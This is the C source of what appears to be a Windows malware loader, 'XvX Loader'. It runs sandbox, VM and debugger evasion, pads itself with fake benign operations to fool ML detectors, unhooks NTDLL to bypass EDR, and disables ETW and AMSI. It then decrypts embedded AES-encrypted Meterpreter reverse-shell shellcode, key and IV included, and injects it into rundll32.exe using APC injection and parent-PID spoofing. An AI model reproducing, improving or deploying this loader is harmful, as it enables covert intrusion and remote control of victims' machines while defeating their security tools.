/*
 * ██╗  ██╗██╗   ██╗██╗  ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗
 * ╚██╗██╔╝██║   ██║╚██╗██╔╝    ██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
 *  ╚███╔╝ ██║   ██║ ╚███╔╝     ██║     ██║   ██║███████║██║  ██║█████╗  ██████╔╝
 *  ██╔██╗ ╚██╗ ██╔╝ ██╔██╗     ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██╔══██╗
 * ██╔╝ ██╗ ╚████╔╝ ██╔╝ ██╗    ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║
 * ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
 *
 * Multi-stage Windows loader with evasion and EDR bypass capabilities.
 * Executes shellcode via APC injection with PPID spoofing.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "modules/syscalls.h"
#include "modules/sandbox_evasion.h"
#include "modules/unhooking.h"
#include "modules/etw_bypass.h"
#include "modules/amsi_bypass.h"
#include "modules/crypto.h"
#include "modules/injection.h"
#include "modules/obfuscation.h"
#include "modules/ppid_spoofing.h"

// Config
#define DEFAULT_TARGET_PROCESS "rundll32.exe"
#define DEFAULT_PARENT_PROCESS "explorer.exe"
#define DEFAULT_DELAY_SECONDS 30
#ifdef PRODUCTION
#define DEFAULT_SUSPICION_THRESHOLD 50 // Production: strict detection
#else
#define DEFAULT_SUSPICION_THRESHOLD 150 // Debug: allow VM execution for testing
#endif

typedef struct _LOADER_CONFIG
{
    DWORD delaySeconds;
    DWORD suspicionThreshold;
    CHAR targetProcess[MAX_PATH];
    CHAR parentProcess[MAX_PATH];
} LOADER_CONFIG;

static LOADER_CONFIG g_config;

void SetupEnvironment(void)
{
#ifdef PRODUCTION
    // Hide console window in production mode
    FreeConsole();
#endif

    // Add legitimate-looking imports to dilute suspicious API patterns
    // These calls are benign and increase the "legitimate API" ratio
    (void)GetModuleHandleA("kernel32.dll");
    (void)GetVersion();
    (void)GetCurrentProcessId();
    (void)GetCurrentThreadId();
}

// Sleeps for specified seconds and checks if time actually passed (sandbox detection)
BOOL AntiSandboxDelay(DWORD seconds)
{
    LARGE_INTEGER frequency, startTime, endTime;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);

    Sleep(seconds * 1000);

    QueryPerformanceCounter(&endTime);

    DWORD elapsedMs = (DWORD)(((endTime.QuadPart - startTime.QuadPart) * 1000) / frequency.QuadPart);
    DWORD expectedMs = seconds * 1000;
    DWORD minAcceptableMs = (DWORD)(expectedMs * 0.90);

    // If time was skipped, we're probably in a sandbox
    if (elapsedMs < minAcceptableMs)
    {
        return FALSE;
    }

    return TRUE;
}

// Fake legitimate file operations to dilute suspicious API patterns
static void PerformLegitimateFileOperations(void)
{
    CHAR tempPath[MAX_PATH];
    CHAR tempFile[MAX_PATH];

    // Get temp directory (legitimate API)
    GetTempPathA(MAX_PATH, tempPath);

    // Create a temp filename (legitimate API)
    GetTempFileNameA(tempPath, "CFG", 0, tempFile);

    // Check if file exists (legitimate API)
    DWORD attrs = GetFileAttributesA(tempFile);
    if (attrs != INVALID_FILE_ATTRIBUTES)
    {
        DeleteFileA(tempFile);
    }

    // Get system directory (legitimate API)
    CHAR sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);

    // Get Windows directory (legitimate API)
    CHAR winDir[MAX_PATH];
    GetWindowsDirectoryA(winDir, MAX_PATH);
}

// Fake legitimate business logic functions to reduce ML suspicion
static DWORD CalculateChecksum(const BYTE *data, SIZE_T length)
{
    DWORD checksum = 0x5A5A5A5A;
    for (SIZE_T i = 0; i < length; i++)
    {
        checksum = ((checksum << 5) | (checksum >> 27)) ^ data[i];
    }
    return checksum;
}

static BOOL ValidateConfiguration(LOADER_CONFIG *config)
{
    if (!config)
        return FALSE;
    if (config->delaySeconds == 0)
        return FALSE;
// Allow higher threshold in debug mode (up to 200 for VM testing)
#ifdef PRODUCTION
    if (config->suspicionThreshold > 100)
        return FALSE;
#else
    if (config->suspicionThreshold > 200)
        return FALSE;
#endif
    return TRUE;
}

static void ProcessConfigurationData(void)
{
    // Fake legitimate data processing
    BYTE tempBuffer[256];
    for (int i = 0; i < 256; i++)
    {
        tempBuffer[i] = (BYTE)(i ^ 0xAA);
    }

    DWORD result = CalculateChecksum(tempBuffer, sizeof(tempBuffer));
    if (result != 0)
    {
        // Ensure this code isn't optimized away
        volatile DWORD dummy = result;
        (void)dummy;
    }
}

void LoadDefaultConfig(LOADER_CONFIG *config)
{
    config->delaySeconds = DEFAULT_DELAY_SECONDS;
    config->suspicionThreshold = DEFAULT_SUSPICION_THRESHOLD;
    strcpy(config->targetProcess, DEFAULT_TARGET_PROCESS);
    strcpy(config->parentProcess, DEFAULT_PARENT_PROCESS);
}

BOOL RunEvasionChecks(void)
{
    EVASION_RESULT evasion = {0};
    CheckSandboxEnvironment(&evasion);

#ifndef PRODUCTION
    // DEBUG MODE: Show evasion score but continue execution
    printf("[*] Evasion score: %d / %d\n", evasion.score, g_config.suspicionThreshold);
    if (evasion.score >= g_config.suspicionThreshold)
    {
        printf("[!] WARNING: High suspicion detected, but continuing in debug mode\n");
    }
    // FORCE EXECUTION IN DEBUG MODE (ignore all checks)
    printf("[*] DEBUG: Forcing execution despite environment checks\n");
#else
    // PRODUCTION MODE: Exit if suspicious environment detected
    if (evasion.score >= g_config.suspicionThreshold)
    {
        return FALSE;
    }
#endif

    RandomSleep(300, 700);
    return TRUE;
}

BOOL UnhookEDR(void)
{
    UNHOOK_RESULT unhook = {0};

    if (!UnhookNTDLL(&unhook))
    {
        return FALSE;
    }

    RandomSleep(200, 500);
    return TRUE;
}

BOOL BypassTelemetry(void)
{
    ETW_RESULT etw = {0};
    AMSI_RESULT amsi = {0};

    DisableETW(&etw);
    DisableAMSI(&amsi);

    RandomSleep(200, 500);
    return TRUE;
}

BOOL DecryptAndInject(void)
{
    // AES-256-CBC encrypted shellcode (Meterpreter reverse_tcp 192.168.56.113:4444)
    BYTE encryptedShellcode[] = {
        0x6A, 0xC5, 0xFC, 0x17, 0x71, 0x5A, 0x15, 0x06, 0x15, 0xCE, 0x82, 0x00, 
        0x49, 0xDD, 0x74, 0x7E, 0x50, 0xB1, 0x49, 0xA5, 0xC3, 0x7A, 0xAE, 0xF5, 
        0xBF, 0x72, 0x4E, 0xD2, 0x2A, 0x4D, 0xF4, 0xF3, 0x67, 0x36, 0x63, 0x5C, 
        0xB0, 0x48, 0x56, 0xEA, 0x3C, 0x31, 0x23, 0x80, 0xA9, 0x49, 0x57, 0x01, 
        0x5D, 0xE9, 0xCF, 0x49, 0xE8, 0xC6, 0x21, 0x00, 0x12, 0x25, 0x8E, 0xD7, 
        0xDE, 0xD2, 0x2D, 0x16, 0xAD, 0x4B, 0xDA, 0xD0, 0x99, 0xC7, 0xA4, 0x1D, 
        0x48, 0x7D, 0x8E, 0x62, 0x63, 0xCB, 0x37, 0x9F, 0x55, 0xF2, 0x00, 0xCE, 
        0xBB, 0x42, 0xAC, 0xA1, 0xFA, 0x97, 0x30, 0xA4, 0x4E, 0x15, 0x4A, 0xE9, 
        0xDD, 0x09, 0x73, 0xC2, 0xF7, 0x59, 0xB6, 0xDE, 0x18, 0x59, 0x99, 0x51, 
        0x22, 0xBB, 0x0E, 0xC4, 0x67, 0x54, 0x62, 0x16, 0x4C, 0x9A, 0x1E, 0x1D, 
        0xFC, 0xE6, 0x78, 0x1E, 0x75, 0x60, 0x2B, 0x4D, 0x6B, 0x27, 0x4B, 0x37, 
        0x36, 0x0C, 0x72, 0x61, 0xA5, 0xDE, 0x5E, 0x43, 0x42, 0x9A, 0xD9, 0x1F, 
        0xB6, 0x1E, 0xF9, 0x6B, 0x9E, 0xE3, 0x63, 0x91, 0x98, 0xAC, 0x64, 0xC0, 
        0xB3, 0xB7, 0xC7, 0x3B, 0xDB, 0x3B, 0x87, 0x12, 0x89, 0x82, 0xD7, 0x43, 
        0x4A, 0xC2, 0x54, 0xEC, 0x49, 0x8C, 0xE8, 0xB3, 0x64, 0x97, 0xC1, 0x67, 
        0x49, 0x55, 0xA4, 0x3F, 0xD3, 0x62, 0x49, 0xE3, 0xC8, 0xDD, 0xE3, 0x6E, 
        0x0E, 0x49, 0x82, 0x1D, 0xEF, 0x4B, 0x0C, 0x23, 0x13, 0x78, 0x48, 0x38, 
        0xB0, 0x47, 0xC3, 0x90, 0x25, 0x24, 0x14, 0x57, 0xE3, 0x4C, 0xE2, 0x77, 
        0x39, 0x15, 0xE0, 0x80, 0x0D, 0x4E, 0x18, 0x64, 0x66, 0xFC, 0xCF, 0x7D, 
        0x19, 0x88, 0xB8, 0x5F, 0xFC, 0xCF, 0x03, 0xCE, 0xF7, 0x10, 0x11, 0xFB, 
        0x48, 0xA7, 0x5C, 0x8B, 0xDF, 0x6F, 0x80, 0x8E, 0x49, 0xA2, 0x9B, 0x16, 
        0x60, 0x72, 0x80, 0xA0, 0x48, 0x55, 0x34, 0x71, 0xC1, 0x9D, 0xB5, 0x80, 
        0x92, 0x79, 0xE2, 0x1C, 0xAF, 0x5D, 0xDD, 0x88, 0xB0, 0x09, 0x29, 0x02, 
        0xE3, 0xF0, 0xB5, 0x34, 0xE3, 0xEB, 0x1B, 0xAA, 0x0C, 0x63, 0x3A, 0x83, 
        0x8C, 0x28, 0x3E, 0xDE, 0x29, 0x61, 0x67, 0x9F, 0x52, 0x96, 0xF2, 0x29, 
        0xD9, 0x7C, 0xE9, 0x4B, 0x77, 0x0B, 0x09, 0x28, 0x16, 0x60, 0x6A, 0xDA, 
        0x8A, 0xC6, 0x12, 0x21, 0x88, 0xCB, 0xEF, 0xC3, 0x5B, 0x78, 0x54, 0x66, 
        0x86, 0xAE, 0x63, 0x9E, 0x88, 0x14, 0x99, 0x54, 0x8A, 0x9F, 0xCE, 0x92, 
        0x13, 0x8E, 0x41, 0x24, 0x4C, 0x54, 0xF8, 0x2C, 0xB3, 0xB6, 0x3C, 0xF5, 
        0xB9, 0x40, 0x01, 0xD6, 0x0A, 0x9E, 0x88, 0x5F, 0xBE, 0x81, 0x14, 0x92, 
        0x3C, 0xA6, 0x1F, 0x3B, 0x1C, 0x4B, 0xAA, 0x2C, 0xEA, 0x47, 0x49, 0x42, 
        0x2C, 0xE5, 0x47, 0x19, 0x45, 0xB2, 0xD0, 0xB3, 0xB5, 0xB1, 0x13, 0x20, 
        0x39, 0xFE, 0x3B, 0x21, 0x32, 0x17, 0x09, 0x59, 0xCD, 0x63, 0xF3, 0x15, 
        0x52, 0x5D, 0xD6, 0x92, 0xF8, 0xBB, 0xA5, 0xBA, 0xEB, 0x45, 0x2D, 0x58, 
        0xBA, 0xAA, 0x53, 0xF9, 0x6C, 0x39, 0x69, 0xD9, 0xB7, 0xFF, 0x16, 0xFE, 
        0xB8, 0x0C, 0x03, 0xA9, 0xF8, 0x38, 0xA9, 0x0A, 0x60, 0x1C, 0x1A, 0xE2, 
        0x5C, 0xA2, 0x7B, 0x16, 0xAF, 0xC1, 0xD7, 0x9B, 0x09, 0xAD, 0x12, 0xE7, 
        0x20, 0x18, 0x2A, 0x0D, 0xE8, 0x3D, 0x7A, 0x58, 0x4C, 0x9F, 0xCE, 0x4C, 
        0xC9, 0x4D, 0x46, 0x99, 0x7E, 0xD9, 0x24, 0xD2, 0x7D, 0xC5, 0x36, 0x65, 
        0xEE, 0xDA, 0xD5, 0xF0, 0x6D, 0xFF, 0xA2, 0x65, 0x85, 0x9F, 0xE0, 0x68, 
        0xB2, 0x28, 0xB0, 0xBE, 0x2B, 0xE0, 0xDF, 0xD6, 0x86, 0x87, 0xBE, 0xA7, 
        0x4C, 0x1D, 0x44, 0x71, 0xB9, 0xFB, 0x25, 0x07, 0x49, 0x42, 0x99, 0xDC, 
        0x7A, 0x46, 0x33, 0x5D, 0x19, 0xF7, 0xAD, 0x69
    };

    // AES-256 Key (32 bytes)
    BYTE aesKey[32] = {
    0x18, 0x3F, 0x44, 0x4D, 0xA3, 0xBD, 0x5F, 0x17, 0x48, 0xDA, 0x31, 0x64, 
    0x28, 0xB2, 0xA2, 0xEE, 0x95, 0x34, 0x05, 0x1E, 0xCD, 0x9A, 0xCC, 0xBD, 
    0xB1, 0xA5, 0xE1, 0xF2, 0x17, 0x88, 0x35, 0xB8
};

    // AES IV (16 bytes)
    BYTE aesIV[16] = {
    0xBF, 0x0A, 0x86, 0x3C, 0xED, 0xBB, 0xFB, 0x04, 0xE8, 0xFB, 0x64, 0x6B, 0xF2, 0xFF, 0xAF, 0x42
};

    // Junk padding to reduce entropy (looks like config/resource data)
    BYTE junkPadding[] = {
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x43, 0x6F, 0x70, 0x79, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x32, 0x30,
        0x32, 0x35, 0x00, 0x00, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20,
        0x31, 0x2E, 0x30, 0x2E, 0x30, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6F, 0x64,
        0x75, 0x63, 0x74, 0x4E, 0x61, 0x6D, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00};
    (void)junkPadding; // Prevent optimization

    // AES-256-CBC decryption at runtime (much more secure than XOR)
    BYTE *shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!DecryptPayload(encryptedShellcode, sizeof(encryptedShellcode), aesIV, aesKey, &shellcode, &shellcodeSize))
    {
#ifndef PRODUCTION
        printf("[-] AES decryption failed\n");
#endif
        return FALSE;
    }

    if (!InitializeInjectionSyscalls())
    {
        free(shellcode);
        return FALSE;
    }

    INJECTION_RESULT injection = {0};

    if (!InjectShellcodeAPCWithPPIDSpoof(
            g_config.targetProcess,
            g_config.parentProcess,
            shellcode,
            shellcodeSize,
            &injection))
    {
        free(shellcode);
        CleanupInjectionSyscalls();
        return FALSE;
    }

    CleanupInjectionSyscalls();
    SecureZeroMemory(shellcode, shellcodeSize);
    free(shellcode);

    RandomSleep(200, 500);
    return TRUE;
}

int main()
{
#ifndef PRODUCTION
    printf("[DEBUG] Loader starting...\n");
    printf("[DEBUG] Loading default config...\n");
#endif

    LoadDefaultConfig(&g_config);

#ifndef PRODUCTION
    printf("[DEBUG] Setting up environment...\n");
#endif

    SetupEnvironment();

#ifndef PRODUCTION
    printf("[DEBUG] Initialization complete\n");
#endif

#ifdef PRODUCTION
    // Check for debugger (PRODUCTION ONLY)
    if (IsDebuggerPresent())
    {
        return EXIT_SUCCESS;
    }
#else
    // DEBUG MODE: Skip debugger check to allow testing
    printf("[*] XvX Loader v3.0-RT (DEBUG MODE)\n");
    printf("[*] Debugger check DISABLED for testing\n\n");
#endif

// Extended delay to bypass sandbox timeout (most sandboxes stop after 60-90s)
// Also performs anti-acceleration checks
#ifndef PRODUCTION
    printf("[*] Performing extended delay check (5s DEBUG MODE)...\n");
#endif

#ifdef PRODUCTION
    if (!AntiSandboxDelay(120))
    {
#else
    if (!AntiSandboxDelay(5))
    { // DEBUG: 5s instead of 120s
#endif
#ifndef PRODUCTION
        printf("[!] Time acceleration detected - exiting\n");
#endif
        return EXIT_SUCCESS;
    }

// Wait to bypass automated sandboxes
#ifndef PRODUCTION
    printf("[*] Second delay: %d seconds...\n", g_config.delaySeconds);
#endif
    AntiSandboxDelay(g_config.delaySeconds);

// Fake legitimate operations to reduce ML suspicion
#ifndef PRODUCTION
    printf("[*] Performing fake legitimate operations...\n");
#endif
    PerformLegitimateFileOperations();

#ifndef PRODUCTION
    printf("[*] Processing configuration data...\n");
#endif
    ProcessConfigurationData();

#ifndef PRODUCTION
    printf("[*] Validating configuration...\n");
#endif
    if (!ValidateConfiguration(&g_config))
    {
#ifndef PRODUCTION
        printf("[!] Configuration validation failed\n");
#endif
        return EXIT_SUCCESS;
    }

// STAGE 1: Check if we're in a virtual machine or sandbox
#ifndef PRODUCTION
    printf("\n[*] STAGE 1: Running evasion checks...\n");
#endif
    if (!RunEvasionChecks())
    {
#ifndef PRODUCTION
        printf("[!] Evasion checks failed - exiting\n");
#endif
        return EXIT_SUCCESS;
    }

// STAGE 2: Remove EDR hooks from system DLLs
#ifndef PRODUCTION
    printf("\n[*] STAGE 2: Unhooking EDR...\n");
#endif
    if (!UnhookEDR())
    {
#ifndef PRODUCTION
        printf("[!] Unhooking failed - exiting\n");
#endif
        ExitProcess(EXIT_FAILURE);
    }

// STAGE 3: Disable Windows event logging and antimalware scanning
#ifndef PRODUCTION
    printf("\n[*] STAGE 3: Bypassing telemetry (AMSI/ETW)...\n");
#endif
    BypassTelemetry();

// STAGE 4: Inject and execute payload
#ifndef PRODUCTION
    printf("\n[*] STAGE 4: Decrypting and injecting shellcode...\n");
#endif
    if (!DecryptAndInject())
    {
#ifndef PRODUCTION
        printf("[!] Injection failed - exiting\n");
#endif
        ExitProcess(EXIT_FAILURE);
    }

#ifndef PRODUCTION
    printf("\n[+] ALL STAGES COMPLETED SUCCESSFULLY!\n");
#endif
    return EXIT_SUCCESS;
}
